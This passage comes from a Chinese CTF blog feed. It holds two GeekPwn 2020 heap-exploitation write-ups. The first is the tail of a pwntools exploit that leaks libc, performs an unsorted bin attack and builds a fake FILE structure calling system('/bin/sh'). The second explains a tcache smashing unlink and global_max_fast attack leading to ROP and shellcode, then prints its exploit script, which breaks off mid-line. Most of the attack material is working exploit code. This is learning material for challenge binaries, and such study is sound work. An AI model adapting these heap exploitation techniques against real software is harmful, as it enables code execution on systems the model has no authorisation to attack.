function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Input your choice:'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'4'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#leak libc</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"0x"</span><span class="token punctuation">)</span>libc_addr <span class="token operator">=</span> int<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>libc_addr <span class="token operator">=</span> <span class="token punctuation">(</span>libc_addr <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span><span class="token number">0xa00000</span><span class="token operator">+</span><span class="token number">0x30</span>libc_addr <span class="token operator">=</span> libc_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'sleep'</span><span class="token punctuation">]</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">"libc addr => "</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>libc_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>system_addr <span class="token operator">=</span> libc_addr <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>io_list_all <span class="token operator">=</span> libc_addr <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'_IO_list_all'</span><span class="token punctuation">]</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">"system addr => "</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">"IO_list_all addr => "</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>io_list_all<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># ------0x68 heap addr--------</span>payload <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x61</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">5</span>edit<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span>len<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>payload <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x61</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">5</span>edit<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token operator">+</span><span class="token number">0x60</span><span class="token punctuation">,</span>len<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>payload <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x61</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">9</span>edit<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token operator">+</span><span class="token number">0x60</span><span class="token operator">+</span><span class="token number">0x60</span><span class="token punctuation">,</span>len<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># ------heap addr and 0xd8 libc addr--------</span>payload <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x141</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">0x20</span>edit<span class="token punctuation">(</span><span class="token number">0x160</span><span class="token punctuation">,</span>len<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>payload <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x91</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0x140</span><span class="token punctuation">,</span>len<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0x1b0</span><span class="token punctuation">,</span>len<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0x150</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0x1c0</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0x170</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># ------- unsorted bin attack ----</span>payload <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0xa1</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span>len<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># create fake file struct </span>fake_file <span class="token operator">=</span> <span class="token string">"/bin/sh;"</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x61</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>io_list_all<span class="token number">-0x10</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token comment" spellcheck="true"># unsorted bin attack，顺便修改下size为0x61</span>edit<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span>len<span class="token punctuation">(</span>fake_file<span class="token punctuation">)</span><span class="token punctuation">,</span>fake_file<span class="token punctuation">)</span>fake_file<span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">21</span>edit<span class="token punctuation">(</span><span class="token number">0xa0</span><span class="token punctuation">,</span>len<span class="token punctuation">(</span>fake_file<span class="token punctuation">)</span><span class="token punctuation">,</span>fake_file<span class="token punctuation">)</span>fake_file<span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0xb0</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">]</span>   <span class="token comment" spellcheck="true"># vtable</span>edit<span class="token punctuation">(</span><span class="token number">0xa0</span><span class="token operator">+</span><span class="token number">0x8</span><span class="token operator">*</span><span class="token number">23</span><span class="token punctuation">,</span>len<span class="token punctuation">(</span>fake_file<span class="token punctuation">)</span><span class="token punctuation">,</span>fake_file<span class="token punctuation">)</span>fake_file<span class="token operator">=</span>p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">]</span>edit<span class="token punctuation">(</span><span class="token number">0x1c8</span><span class="token punctuation">,</span>len<span class="token punctuation">(</span>fake_file<span class="token punctuation">)</span><span class="token punctuation">,</span>fake_file<span class="token punctuation">)</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># ------make unsorted bin --------</span><span class="token comment" spellcheck="true"># gdb.attach(p)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 2020 Game </category>
          
      </categories>
      
      
        <tags>
            
            <tag> GeekPwn 2020 </tag>
            
            <tag> FSOP </tag>
            
            <tag> unsorted bin attack </tag>
            
            <tag> IO attack </tag>
            
            <tag> largebin attack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020-GeekPwn-playthenew</title>
      <link href="/2020/08/06/2020-geekpwn-playthenew/"/>
      <url>/2020/08/06/2020-geekpwn-playthenew/</url>
      
        <content type="html"><![CDATA[<h1 id="1-查看文件"><a href="#1-查看文件" class="headerlink" title="1.查看文件"></a>1.查看文件</h1><div style="width:50%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/08/06/2020-geekpwn-playthenew/0.png"></div><div style="width:50%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/08/06/2020-geekpwn-playthenew/1.png"></div>保护全开，同时伴随着沙箱# 2.IDA分析同时该二进制文件是没有符号表的，所以也加大了逆向难度。最后一步一步逆后大概就这样的一些关键点：**创建要求0x80~0x200，那么就避免了fastbin和largebin的情况。**<div style="width:80%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/08/06/2020-geekpwn-playthenew/2.png"></div>**看汇编很清楚的可以看到删除时指针未清零，那么就有UAF的情况了**<div style="width:80%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/08/06/2020-geekpwn-playthenew/3.png"></div>**除此之外有个后门函数，判断其对应的位置是不是0x42，然后执行call target，target和rdi可控**<div style="width:80%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/08/06/2020-geekpwn-playthenew/4.png"></div>show功能和edit功能正常。<h1 id="3-思路"><a href="#3-思路" class="headerlink" title="3.思路"></a>3.思路</h1><p>很明显的意图可以想到我们需要修改其对应的位置的值，将0x42改为其它的内容。</p><p>这道题优点像one_punch_man和高效战役的two_chunk，但是比较恶心的是没有malloc功能的函数。如果我们进行tcache smashing attack后改掉对应位置的fd要怎么去取呢？</p><p>实际上我们可以换个思路，我们可以考虑先利用一次tcache smashing unlink来达到调用后门函数的要求，也就是利用归类smallbin进入tcache的时候任意地址（0x100000）写libc地址的机会将0x42改掉。这个时候就可以调用后门函数了。但是这个时候又有一个问题，我们需要控制0x100000处的地址来实现任意函数调用的目的，那我们又该怎么做呢？那说白了我们还是需要想办法来分配到0x100000的地址，而且是在没有malloc的情况。</p><p>大概讲讲tcache smashing unlink的思路：利用一条0x160的tcache list（满的7个）和一条0xb0的tache list（6个）。当0x160满了之后释放的chunk进入unsorted bin，这时候切割一下，将0xb0剩下，通过calloc一个更大的chunk令其归入smallbin中。再用一次这个方法使0xb0的smallbin有两个chunk，此时利用UAF修改后进入smallbin的0xb0的chunk的bk为0x100000-8-4，在calloc 0xb0的chunk，则先进入的chunk会被分配，后进入的会进入tcache，由于进入tcache没有检查：</p><div style="width:80%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/08/06/2020-geekpwn-playthenew/5.png"></div>就可以0x100000-4写main_arena地址。此时这个chunk也进入tcache了，对应的0xb0就满了，也不会再继续向后索引检查了，也就不会报错。<p><strong>来自Ama2in9师傅的思路，改掉global_max_fast来达到可以对大chunk进行fastbin的利用。具体就是当改掉global_max_fast后释放chunk就会当作fastbin处理（0x90~0x200），分配的时候calloc同样会找fastbin链有没有chunk</strong>。但是Ama2in9师傅后面的思路就有点麻烦了，大概是利用fastbin分配的特点在释放了的fd处伪造个size，chunk分配后就会将这个size当作下一个fd写到main_arena，这时再利用修改另一条链fd的目的劫持到size处，也就达到了劫持main_arena的目的，最后就可以改top chunk了。</p><p>在这里我的思路是：利用释放0xd0 size的chunk来覆盖掉top chunk，因为此时会将一切大小的chunk作为fastbin chunk处理。那么此时top chunk就是这个0xd0的chunk地址，此时利用UAF改其fd为0x100000，这样再malloc(0xc0)就可以将0x100000写入top chunk了。还需要注意一点：<strong>top chunk的size需要小于0x21000，在2.23里面没有检查</strong>这就要求我们向0x100000写libc地址的时候需要错位改一下0x100008的值为0x7fff。此时就可以随便分配fake topchunk了。注意一点：<strong>由于fastbin分配的时候会有检查，不为空的时候：victim-&gt;bk-&gt;fd = victim，那么由于对应的fastbin链中（实际上就是smallbin了）本身就有libc地址那么malloc的时候list检查肯定会出错，所以我们就要提前准备一个size的链，保证释放后这个地址是有chunk的地址不是libc，同时改这个chunk的fd为0就可以正常分配释放这个size的chunk了</strong>。我们选取0x120的chunk来进行分配释放，由于0x100000可控了。我们首先选择调用puts函数，参数为environ打印出stack地址。再删除再malloc调用gets，地址为调用backdoor的返回地址，写入rop令我们指定的0x100000地址数据可执行，提前再分配一个0x120 的chunk写入shellcode（ORW的shellcode），最后rop可以接着写pop rax，call rax打印出flag。</p><p><strong>总结</strong>：<br><strong>第一步</strong>：泄露libc地址和heap地址。<br><strong>第二步</strong>：第一次tcache smashing unlink，一次改0x100000！=0x42，同时也可以修改0x10008=0x7fff（错位写）。<br><strong>第三步</strong>：第二次tcache smashing unlink改global_max_fast。<br><strong>第四步</strong>：释放0xd0的chunk覆盖top chunk的位置，同时改fd为0x100000，通过一次分配0xd0的chunk就可以控制0x100000的地址了。<br><strong>第五步</strong>：第一次利用puts函数，参数为environ得到stack地址。第二次利用gets向栈返回地址写入rop执行mprotect使0x100000可执行。再此之前在对应的位置写上shellcode，这样rop就可以加一条pop rax；call rax来得到flag了。</p><h1 id="4-exp"><a href="#4-exp" class="headerlink" title="4.exp"></a>4.exp</h1><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding=utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment" spellcheck="true"># context.terminal = ["tmux","split","-h"]</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">"amd64"</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./pwn"</span><span class="token punctuation">)</span>    elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./pwn"</span><span class="token punctuation">)</span>    libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/usr/lib/x86_64-linux-gnu/libc-2.29.so"</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"127.0.0.1"</span><span class="token punctuation">,</span><span class="token number">1234</span><span class="token punctuation">)</span>    elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./pwn"</span><span class="token punctuation">)</span>    libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./libc.so"</span><span class="token punctuation">)</span>se      <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data<span class="token punctuation">)</span>sa      <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data         <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span>sl      <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>data<span class="token punctuation">)</span>sla     <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data         <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span>sea     <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data         <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span>rc      <span class="token operator">=</span> <span class="token keyword">lambda</span> numb<span class="token operator">=</span><span class="token number">4096</span>          <span class="token punctuation">:</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token punctuation">)</span>rl      <span class="token operator">=</span> <span class="token keyword">lambda</span>                    <span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>ru      <span class="token operator">=</span> <span class="token keyword">lambda</span> delims              <span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>delims<span class="token punctuation">)</span>uu32    <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>u32<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>uu64    <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>u64<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">create</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    sla<span class="token punctuation">(</span><span class="token string">">"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">)</span>    sla<span class="token punctuation">(</span><span class="token string">"index:"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    sla<span class="token punctuation">(</span><span class="token string">"basketball:"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    sa<span class="token punctuation">(</span><span class="token string">"name:"</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    sla<span class="token punctuation">(</span><span class="token string">">"</span><span class="token punctuation">,</span><span class="token string">"2"</span><span class="token punctuation">)</span>    sla<span class="token punctuation">(</span><span class="token string">"basketball:"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    sla<span class="token punctuation">(</span><span class="token string">">"</span><span class="token punctuation">,</span><span class="token string">"3"</span><span class="token punctuation">)</span>    sla<span class="token punctuation">(</span><span class="token string">"basketball:"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    sla<span class="token punctuation">(</span><span class="token string">">"</span><span class="token punctuation">,</span><span class="token string">"4"</span><span class="token punctuation">)</span>    sla<span class="token punctuation">(</span><span class="token string">"basketball:"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    sa<span class="token punctuation">(</span><span class="token string">"basketball:"</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">backdoor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    sla<span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">0x666</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># ------ show heap address &amp; libc address -------</span>create<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x180</span><span class="token punctuation">,</span><span class="token string">"\n"</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x180</span><span class="token punctuation">,</span><span class="token string">"\n"</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>ru<span class="token punctuation">(</span><span class="token string">"Show the dance:"</span><span class="token punctuation">)</span>heap_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x10</span>success<span class="token punctuation">(</span><span class="token string">"heap address ==> "</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>heap_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    create<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x180</span><span class="token punctuation">,</span><span class="token string">"\n"</span><span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    create<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0xa0</span><span class="token punctuation">,</span><span class="token string">"\n"</span><span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    create<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0xb0</span><span class="token punctuation">,</span><span class="token string">"\n"</span><span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    create<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0xc0</span><span class="token punctuation">,</span><span class="token string">"\n"</span><span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">0xc0</span><span class="token punctuation">,</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    create<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x120</span><span class="token punctuation">,</span><span class="token string">"\n"</span><span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x180</span><span class="token punctuation">,</span><span class="token string">"\n"</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x190</span><span class="token punctuation">,</span><span class="token string">"\n"</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># UAF size = 0x190</span>show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>ru<span class="token punctuation">(</span><span class="token string">"Show the dance:"</span><span class="token punctuation">)</span>static_libc <span class="token operator">=</span> <span class="token number">0x7ffff7dce000</span>main_arena <span class="token operator">=</span> <span class="token number">0x00007ffff7fb2ca0</span>heap_static <span class="token operator">=</span> <span class="token number">0x55555555a250</span>libc<span class="token punctuation">.</span>address <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>static_libc<span class="token operator">-</span>main_arenasuccess<span class="token punctuation">(</span><span class="token string">"libc address ==> "</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># -------- tcache smashing unlink attack modify 0x10000 have libc addr ---------</span>create<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0xd0</span><span class="token punctuation">,</span><span class="token string">"\n"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 1</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    create<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x1a0</span><span class="token punctuation">,</span><span class="token string">"\n"</span><span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x1a0</span><span class="token punctuation">,</span><span class="token string">"\n"</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0x1b0</span><span class="token punctuation">,</span><span class="token string">"\n"</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>             <span class="token comment" spellcheck="true"># we can uaf 0x1a0 size, this chunk have been split</span>create<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0xf0</span><span class="token punctuation">,</span><span class="token string">"\n"</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x1b0</span><span class="token punctuation">,</span><span class="token string">"\n"</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token 